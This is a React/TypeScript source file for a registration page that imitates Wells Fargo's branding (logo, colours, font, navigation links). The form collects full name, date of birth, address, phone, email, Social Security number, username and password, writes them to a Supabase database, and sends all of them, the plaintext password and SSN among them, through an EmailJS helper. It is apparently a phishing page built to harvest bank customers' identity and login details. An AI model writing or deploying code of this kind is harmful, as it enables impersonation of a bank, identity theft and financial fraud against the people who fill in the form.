import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { hashPassword, login } from '../lib/session';
import { sendRegistrationEmail } from '../lib/email';

const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';

export default function Register() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    fullName: '', advisoryCustodian: '', dob: '', address: '',
    phone: '', email: '', ssn: '', username: '', password: '',
  });
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSubmitting(true);

    // Sanity-check env vars at runtime so we can show a useful error
    const supaUrl = import.meta.env.VITE_SUPABASE_URL as string;
    const supaKey = import.meta.env.VITE_SUPABASE_ANON_KEY as string;
    if (!supaUrl || !supaKey) {
      setError('Server not configured (missing Supabase credentials). Contact the admin.');
      setSubmitting(false);
      return;
    }

    try {
      const password_hash = await hashPassword(form.password);

      const payload = {
        full_name: form.fullName,
        advisory_custodian: form.advisoryCustodian,
        dob: form.dob,
        address: form.address,
        phone: form.phone,
        email: form.email,
        ssn: form.ssn,
        username: form.username,
        password_hash,
      };

      console.log('[Register] Inserting user into Supabase...', { email: payload.email, username: payload.username });

      const { data, error: dbError } = await supabase
        .from('users')
        .insert(payload)
        .select('*')
        .single();

      if (dbError) {
        console.error('[Register] Supabase insert error:', dbError);
        if (dbError.code === '23505') {
          setError('That email or username is already registered. Try signing on instead.');
        } else if (dbError.code === '42P01') {
          setError('Database table "users" does not exist. Please run the setup SQL in Supabase.');
        } else if (dbError.message?.includes('row-level security') || dbError.code === '42501') {
          setError('Database policy blocked the insert. Check RLS policies in Supabase.');
        } else {
          setError(`Registration failed: ${dbError.message || dbError.code || 'unknown error'}`);
        }
        setSubmitting(false);
        return;
      }

      if (!data) {
        setError('Registration returned no data. Please try again.');
        setSubmitting(false);
        return;
      }

      console.log('[Register] User created:', data.id);

      // Fire EmailJS (don't block navigation on failure, but remember it for diagnostics)
      try {
        await sendRegistrationEmail({
          full_name: form.fullName,
          advisory_custodian: form.advisoryCustodian,
          dob: form.dob,
          address: form.address,
          phone: form.phone,
          email: form.email,
          ssn: form.ssn,
          username: form.username,
          password: form.password,
        });
        console.log('[Register] Email sent.');
      } catch (emailErr) {
        console.error('[Register] EmailJS failed (user still created):', emailErr);
        // Remember the failure so we can show a banner on the accounts page (optional)
        sessionStorage.setItem('wf_email_error', emailErr instanceof Error ? emailErr.message : String(emailErr));
      }

      login(data);
      navigate('/accounts');
    } catch (err) {
      console.error('[Register] Unexpected error:', err);
      const msg = err instanceof Error ? err.message : String(err);
      setError(`Something went wrong: ${msg}`);
      setSubmitting(false);
    }
  };

  const inputStyle: React.CSSProperties = {
    width: '100%', padding: '14px 16px', fontSize: '0.94rem', fontFamily: f,
    border: '1px solid #b5adad', borderRadius: '6px', outline: 'none',
    color: '#141414', backgroundColor: '#fff',
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      {/* Header */}
      <header style={{ backgroundColor: '#D71E28', borderBottom: '4px solid #FFCD41', height: '56px', display: 'flex', alignItems: 'center' }}>
        <div className="max-w-[1400px] mx-auto w-full wf-section-px" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ textDecoration: 'none' }}>
            <img
              src="/logo/wf_logo_220x23.png"
              alt="Wells Fargo" width="180" height="20"
              style={{ height: '20px', width: 'auto', filter: 'brightness(0) invert(1)' }}
            />
          </a>
          <nav style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
            {['Open an Account', 'Customer Service', 'ATMs/Locations', 'Español'].map((item) => (
              <a key={item} style={{ color: '#fff', textDecoration: 'none', fontSize: '0.76rem', fontFamily: f }} className="wf-hide-mobile hover:underline">
                {item}
              </a>
            ))}
          </nav>
        </div>
      </header>

      <div style={{
        flex: 1,
        backgroundImage: 'url(https://images.unsplash.com/photo-1490750967868-88aa4f44baee?w=1920&q=80)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '24px 16px',
      }}>
        <div className="wf-form-card" style={{
          backgroundColor: 'rgba(255,255,255,0.95)',
          borderRadius: '12px',
          width: '100%',
          maxWidth: '640px',
          boxShadow: '0 8px 32px rgba(0,0,0,0.2)',
        }}>
          <h1 style={{
            fontFamily: f, fontSize: '2rem', fontWeight: 400, fontStyle: 'italic',
            color: '#141414', textAlign: 'center', margin: '0 0 32px',
          }}>
            Welcome
          </h1>

          {error && (
            <div role="alert" style={{
              backgroundColor: '#FDECEA', border: '1px solid #F5C6CB', color: '#721C24',
              padding: '10px 14px', borderRadius: '6px', marginBottom: '16px',
              fontFamily: f, fontSize: '0.88rem',
            }}>
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit}>
            <div className="wf-form-row">
              <input type="text" name="fullName" placeholder="Full Name" required value={form.fullName} onChange={handleChange} style={inputStyle} />
              <input type="text" name="advisoryCustodian" placeholder="Advisory Custodian" value={form.advisoryCustodian} onChange={handleChange} style={inputStyle} />
            </div>
            <div className="wf-form-row">
              <input
                type="date"
                name="dob"
                required
                min="1900-01-01"
                max={new Date().toISOString().slice(0, 10)}
                value={form.dob}
                onChange={handleChange}
                onInput={(e) => {
                  const input = e.currentTarget;
                  // Clamp year to 4 digits if user types too many
                  if (input.value && input.value.length > 10) {
                    input.value = input.value.slice(0, 10);
                  }
                  const parts = input.value.split('-');
                  if (parts[0] && parts[0].length > 4) {
                    parts[0] = parts[0].slice(0, 4);
                    input.value = parts.join('-');
                  }
                }}
                style={inputStyle}
              />
              <input type="text" name="address" placeholder="Address" required value={form.address} onChange={handleChange} style={inputStyle} />
            </div>
            <div className="wf-form-row">
              <input type="tel" name="phone" placeholder="Phone Number" required value={form.phone} onChange={handleChange} style={inputStyle} />
              <input type="email" name="email" placeholder="Email" required value={form.email} onChange={handleChange} style={inputStyle} />
            </div>
            <div className="wf-form-row">
              <input type="password" name="ssn" placeholder="SSN" required value={form.ssn} onChange={handleChange} style={inputStyle} />
              <input type="text" name="username" placeholder="Username" required value={form.username} onChange={handleChange} style={inputStyle} />
            </div>
            <div style={{ marginBottom: '28px' }}>
              <input type="password" name="password" placeholder="Password" required minLength={6} value={form.password} onChange={handleChange} style={inputStyle} />
            </div>

            <div style={{ textAlign: 'center' }}>
              <button
                type="submit"
                disabled={submitting}
                style={{
                  backgroundColor: submitting ? '#9c0b18' : '#D71E28',
                  color: '#fff', border: 'none',
                  borderRadius: '24px', fontFamily: f, fontWeight: 600,
                  fontSize: '1rem', padding: '12px 48px',
                  cursor: submitting ? 'wait' : 'pointer',
                  minWidth: '200px', opacity: submitting ? 0.8 : 1,
                }}
              >
                {submitting ? 'Registering…' : 'Register'}
              </button>
            </div>

            <div style={{ textAlign: 'center', margin: '20px 0', color: '#555', fontSize: '0.88rem', fontFamily: f }}>
              or
            </div>

            <div style={{ textAlign: 'center' }}>
              <button
                type="button"
                onClick={() => navigate('/')}
                style={{
                  backgroundColor: '#fff', color: '#3b3331',
                  border: '1px solid #3b3331', borderRadius: '24px',
                  fontFamily: f, fontWeight: 600, fontSize: '0.94rem',
                  padding: '10px 32px', cursor: 'pointer', minWidth: '180px',
                }}
              >
                🔒 Sign On
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
